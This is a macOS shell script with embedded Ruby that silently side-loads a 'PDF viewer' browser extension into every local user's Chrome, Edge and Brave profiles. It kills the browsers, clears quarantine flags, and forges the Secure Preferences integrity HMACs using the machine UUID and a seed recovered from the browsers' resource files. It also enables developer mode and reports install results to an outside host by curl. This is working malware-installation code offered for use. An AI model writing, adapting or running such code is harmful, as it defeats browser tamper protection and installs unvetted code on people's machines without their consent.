#!/bin/bash
set -e
EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
NOTIFY_URL="https://wln.ink/n"
INJ=0

# Stable extension ID derived from manifest.json "key" field.
# When a manifest contains "key", Chrome derives the ID from the key, so the
# settings entry MUST be filed under this ID. Do NOT use path-based IDs:
# entries under a path-based ID never match and the browser discards them.
EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"

TMP_ZIP="/tmp/pdf-ext.zip"
TMP_DIR="/tmp/pdf-ext-tmp"
curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || { echo "Download failed"; exit 1; }
rm -rf "$TMP_DIR"
unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || { echo "Unzip failed"; exit 1; }
MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
[ -z "$MANIFEST" ] && { echo "Extension not found"; exit 1; }
EXT_SRC=$(dirname "$MANIFEST")
rm -f "$TMP_ZIP"

# Manifest must contain a stable "key", otherwise the extension ID is
# path-derived and changes when the folder moves.
if ! grep -q '"key"[[:space:]]*:' "$MANIFEST"; then
    echo "manifest key missing: extension ID would be unstable"
    exit 1
fi

# Strip update_url so the unpacked entry is not treated as an external/store
# extension subject to InstallVerifier / DISABLE_NOT_VERIFIED (256).
if command -v jq >/dev/null 2>&1; then
    jq 'del(.update_url)' "$MANIFEST" > "$MANIFEST.tmp" 2>/dev/null && mv "$MANIFEST.tmp" "$MANIFEST" || rm -f "$MANIFEST.tmp"
fi

# Inject loc=4 unpacked entry into Secure Preferences with valid HMACs.
# Requires /usr/bin/ruby (always present on macOS) for HMAC-SHA256 forge.
# SID = IOPlatformUUID (device_id); seed = "" for non-Google branding
# (Brave/Edge) or recovered from existing super_mac / resources.pak for Chrome.
inject_secure() {
    local pdir="$1" ext_dir="$2" ext_id="$3"
    local sp="$pdir/Secure Preferences"
    local pref="$pdir/Preferences"
    [ ! -f "$ext_dir/manifest.json" ] && return 1

    # If neither prefs file exists, nothing to inject into (need an existing profile).
    [ ! -f "$pref" ] && [ ! -f "$sp" ] && return 1

    local sid
    sid=$(ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null | sed -n 's/.*IOPlatformUUID" = "\(.*\)"/\1/p' | head -1)
    [ -z "$sid" ] && return 1

    EXT_DIR="$ext_dir" EXT_ID="$ext_id" SP_FILE="$sp" PREF_FILE="$pref" SID="$sid" \
    ruby -rjson -ropenssl - <<'RUBY' || return 1
require 'json'
require 'openssl'

ext_id = ENV.fetch('EXT_ID')
ext_dir = ENV.fetch('EXT_DIR')
sp_path = ENV.fetch('SP_FILE')
pref_path = ENV.fetch('PREF_FILE')
sid = ENV.fetch('SID')
seed = ''.b  # empty seed for non-Google branding; recovered below if needed

def remove_empty(v)
  case v
  when Hash
    out = {}
    v.each do |k, x|
      nx = remove_empty(x)
      next if nx.is_a?(Hash) && nx.empty?
      next if nx.is_a?(Array) && nx.empty?
      out[k] = nx
    end
    out
  when Array
    v.map { |x| remove_empty(x) }.reject { |x| (x.is_a?(Hash) && x.empty?) || (x.is_a?(Array) && x.empty?) }
  else
    v
  end
end

def sort_deep(v)
  case v
  when Hash then v.keys.sort.each_with_object({}) { |k, h| h[k] = sort_deep(v[k]) }
  when Array then v.map { |x| sort_deep(x) }
  else v
  end
end

def leaf_mac(value, path, sid, seed)
  cleaned = value.is_a?(Hash) ? sort_deep(remove_empty(value)) : value
  msg = sid + path + JSON.generate(cleaned).gsub('<', '\\u003C')
  OpenSSL::HMAC.hexdigest('SHA256', seed, msg).upcase
end

def super_mac_of(macs, sid, seed)
  OpenSSL::HMAC.hexdigest('SHA256', seed, sid + JSON.generate(macs)).upcase
end

def write_json(path, data)
  tmp = path + '.tmp-inject'
  File.write(tmp, JSON.generate(data))
  File.chmod(0600, tmp)
  File.rename(tmp, path)
end

# --- Preferences: strip our id from invalid_ids (not signed) ---
if File.exist?(pref_path)
  begin
    pdata = JSON.parse(File.read(pref_path))
    sig = pdata.dig('extensions', 'install_signature')
    if sig && sig['invalid_ids'].is_a?(Array)
      before = sig['invalid_ids'].size
      sig['invalid_ids'] = sig['invalid_ids'] - [ext_id]
      write_json(pref_path, pdata) if sig['invalid_ids'].size != before
    end
  rescue JSON::ParserError
    # ignore corrupt prefs
  end
end

# --- Secure Preferences: build/patch entry + developer_mode + HMACs ---
sdata = if File.exist?(sp_path)
  begin
    JSON.parse(File.read(sp_path))
  rescue JSON::ParserError
    {}
  end
else
  {}
end

sdata['extensions'] ||= {}
sdata['extensions']['settings'] ||= {}
sdata['extensions']['ui'] ||= {}

# Recover seed if Secure Preferences already has a super_mac that does not
# match the empty seed (Google Chrome branding uses IDR_PREF_HASH_SEED_BIN).
existing_super = sdata.dig('protection', 'super_mac')
existing_macs = sdata.dig('protection', 'macs')
if existing_super && existing_macs.is_a?(Hash) && !existing_macs.empty?
  calc = super_mac_of(existing_macs, sid, seed)
  if calc != existing_super
    # Candidate seeds: 32-byte resources from browser resource.pak files.
    paks = Dir.glob('/Applications/*/Contents/**/resources.pak') +
           Dir.glob('/Applications/*/Contents/**/*_100_percent.pak') +
           Dir.glob('/Applications/*/Contents/**/*_200_percent.pak')
    recovered = false
    paks.each do |pak|
      begin
        data = File.binread(pak)
        next unless data.bytesize > 16
        version = data[0, 4].unpack1('V')
        next unless version == 5
        resource_count = data[8, 2].unpack1('v')
        alias_count = data[10, 2].unpack1('v')
        entries = []
        pos = 12
        resource_count.times do
          break if pos + 6 > data.bytesize
          id = data[pos, 2].unpack1('v')
          off = data[pos + 2, 4].unpack1('V')
          entries << [id, off]
          pos += 6
        end
        pos += alias_count * 4
        sorted = entries.sort_by { |_, o| o }
        sorted.each_with_index do |(_id, o), i|
          break if o < 0 || o >= data.bytesize
          nxt = i + 1 < sorted.size ? sorted[i + 1][1] : data.bytesize
          len = nxt - o
          next unless len == 32
          cand = data[o, 32]
          if super_mac_of(existing_macs, sid, cand) == existing_super
            seed = cand
            recovered = true
            break
          end
        end
        break if recovered
      rescue
        next
      end
    end
    # If still not recovered, keep empty seed (best effort; Chrome will rewrite MACs).
  end
end

manifest_path = File.join(ext_dir, 'manifest.json')
manifest = File.exist?(manifest_path) ? JSON.parse(File.read(manifest_path)) : {}
manifest.delete('update_url')

entry = sdata['extensions']['settings'][ext_id] || {}
entry['location'] = 4
entry['creation_flags'] = 1
entry['from_webstore'] = false
entry['disable_reasons'] = []
entry['path'] = ext_dir
entry['manifest'] = manifest unless manifest.empty?
entry['was_installed_by_default'] = false
entry['was_installed_by_oem'] = false
entry['was_pinned_by_default'] = false
entry['active_bit'] = true
entry['newAllowFileAccess'] = true
# Drop encrypted hashes we cannot forge; Chrome re-adds them after load.
sdata['extensions']['settings'][ext_id] = entry

sdata['extensions']['ui']['developer_mode'] = true

sdata['protection'] ||= {}
sdata['protection']['macs'] ||= {}
macs = sdata['protection']['macs']
macs['extensions'] ||= {}
macs['extensions'].delete('settings_encrypted_hash')
if macs['extensions']['ui'].is_a?(Hash)
  macs['extensions']['ui'].delete('developer_mode_encrypted_hash')
end
if macs['account_values'].is_a?(Hash) && macs['account_values']['extensions'].is_a?(Hash) &&
   macs['account_values']['extensions']['ui'].is_a?(Hash)
  macs['account_values']['extensions']['ui'].delete('developer_mode_encrypted_hash')
end
sdata['protection'].delete('super_encrypted_hash')

macs['extensions']['settings'] ||= {}
macs['extensions']['settings'][ext_id] = leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed)
macs['extensions']['ui'] ||= {}
macs['extensions']['ui']['developer_mode'] = leaf_mac(true, 'extensions.ui.developer_mode', sid, seed)
sdata['protection']['super_mac'] = super_mac_of(macs, sid, seed)

# Self-check
raise 'leaf' unless leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed) == macs['extensions']['settings'][ext_id]
raise 'dm' unless leaf_mac(true, 'extensions.ui.developer_mode', sid, seed) == macs['extensions']['ui']['developer_mode']
raise 'super' unless super_mac_of(macs, sid, seed) == sdata['protection']['super_mac']

write_json(sp_path, sdata)
puts "injected loc=4 flags=1 seed_len=#{seed.bytesize}"
RUBY
}

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    pkill -x "$app" 2>/dev/null || true
done
sleep 1

for uhome in /Users/*; do
    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue

    uext="$uhome/Library/Application Support/PDFViewerExt"
    rm -rf "$uext" 2>/dev/null || true
    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue

    # Clear Gatekeeper quarantine so Chrome can read the copied files.
    xattr -dr com.apple.quarantine "$uext" >/dev/null 2>&1 || true

    # Strip update_url from the installed copy as well.
    if command -v jq >/dev/null 2>&1 && [ -f "$uext/manifest.json" ]; then
        jq 'del(.update_url)' "$uext/manifest.json" > "$uext/manifest.json.tmp" 2>/dev/null \
            && mv "$uext/manifest.json.tmp" "$uext/manifest.json" || rm -f "$uext/manifest.json.tmp"
    fi

    export EXT_DIR="$uext"
    export EXT_ID="$EXT_ID"

    for rel in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
        udata="$uhome/Library/Application Support/$rel"
        [ ! -d "$udata" ] && continue

        for pdir in "$udata/Default" "$udata/Profile"*; do
            [ ! -d "$pdir" ] && continue
            if inject_secure "$pdir" "$uext" "$EXT_ID"; then
                INJ=$((INJ + 1))
            fi
        done
    done
done

rm -rf "$TMP_DIR"

if [ $INJ -eq 0 ]; then
    curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
    echo "No browser profiles found"
    exit 1
fi

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    open -a "$app" --args --restore-last-session 2>/dev/null || true
done

curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
echo "Successfully installed to $INJ profiles"
exit 0
